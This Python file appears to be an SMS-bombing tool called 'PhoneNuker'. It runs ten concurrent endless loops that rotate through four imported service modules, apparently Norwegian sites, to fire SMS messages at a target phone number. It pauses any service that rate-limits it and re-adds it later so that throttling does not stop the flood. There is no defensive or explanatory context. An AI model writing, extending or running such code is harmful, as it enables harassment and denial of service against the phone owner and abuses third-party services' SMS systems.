import asyncio
import aiohttp

from site_request.site_1881 import Request as request_1881
from site_request.site_power import Request as request_power  
from site_request.site_skyss import Request as request_skyss  
from site_request.site_teoritentamen import Request as request_teoritentamen  

class PhoneNuker:
    def __init__(self):
        self.phone_number = "YOUR_PHONE_NUMBER_HERE"
        self.request_services = [
            request_1881,
            request_power,
            request_skyss,
            request_teoritentamen,
        ]
        self.lock = asyncio.Lock()
        self._counter = 0

    async def get_next_service(self):
        async with self.lock:
            if not self.request_services:
                return None
            service = self.request_services[self._counter % len(self.request_services)]
            self._counter += 1
            return service

    async def spam_sms_single(self, session, task_id):
        while True:
            request_class = await self.get_next_service()
            if not request_class:
                await asyncio.sleep(1)
                continue

            try:
                request_instance = request_class(self.phone_number, session)
                valid, response, wait_time = await request_instance.send_sms()

                if valid:
                    print(f"[Task {task_id}] Ran {request_class.__module__}: {response}")
                else:
                    if wait_time:
                        asyncio.create_task(self.temporarily_remove_service(request_class, response, wait_time))

            except Exception as e:
                print(f"[Task {task_id}] Error: {e}")

    async def temporarily_remove_service(self, request_class, response, wait_time):
        async with self.lock:
            if request_class in self.request_services:
                self.request_services.remove(request_class)
                print(f"Temporarily removed {request_class.__module__} for {wait_time}s due to: {response}")
            else:
                return

        async def readd():
            await asyncio.sleep(wait_time)
            async with self.lock:
                if request_class not in self.request_services:
                    self.request_services.append(request_class)
                    print(f"Re-added {request_class.__module__} after {wait_time}s")

        asyncio.create_task(readd())

async def main():
    nuker = PhoneNuker()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=10)) as session:
        tasks = [asyncio.create_task(nuker.spam_sms_single(session, i)) for i in range(10)]
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
